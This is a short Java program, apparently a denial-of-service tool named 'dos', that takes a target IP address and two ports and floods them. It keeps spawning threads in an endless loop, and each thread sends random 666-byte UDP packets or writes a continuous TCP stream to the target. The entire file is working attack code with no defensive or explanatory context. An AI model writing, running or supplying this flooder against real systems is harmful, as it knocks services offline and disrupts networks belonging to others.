import java.net.*;
import java.util.Random;

public class dos {
    public static void main(String[] args) {
        if (args.length < 3) {
            System.out.println("Usage: java dos ip udpport tcpport");
            return;
        }
        String ip = args[0];
        int udpport = Integer.parseInt(args[1]);
        int tcpport = Integer.parseInt(args[2]);
        
        while (true) {
            Thread thread = new Thread(() -> UDP(ip, udpport));
            Thread thread2 = new Thread(() -> TCP(ip, tcpport));
        
            thread.start();
            thread2.start();
        }
    }
    
    public static void UDP(String ip, int udpport) {
        try {
            DatagramSocket socket = new DatagramSocket();
            socket.setReuseAddress(true);
            socket.setBroadcast(true);
            socket.setSendBufferSize(102038);
            byte[] data = new byte[666];
            new Random().nextBytes(data);
            InetAddress address = InetAddress.getByName(ip);
            DatagramPacket packet = new DatagramPacket(data, data.length, address, udpport);
            while (true) {
                socket.send(packet);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public static void TCP(String ip, int tcpport) {
        try {
            Socket socket = new Socket();
            socket.setTcpNoDelay(true);
            socket.setSendBufferSize(65507);
            byte[] data = new byte[666];
            new Random().nextBytes(data);
            InetAddress address = InetAddress.getByName(ip);
            InetSocketAddress target = new InetSocketAddress(address, tcpport);
            socket.connect(target);
            while (true) {
                socket.getOutputStream().write(data);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
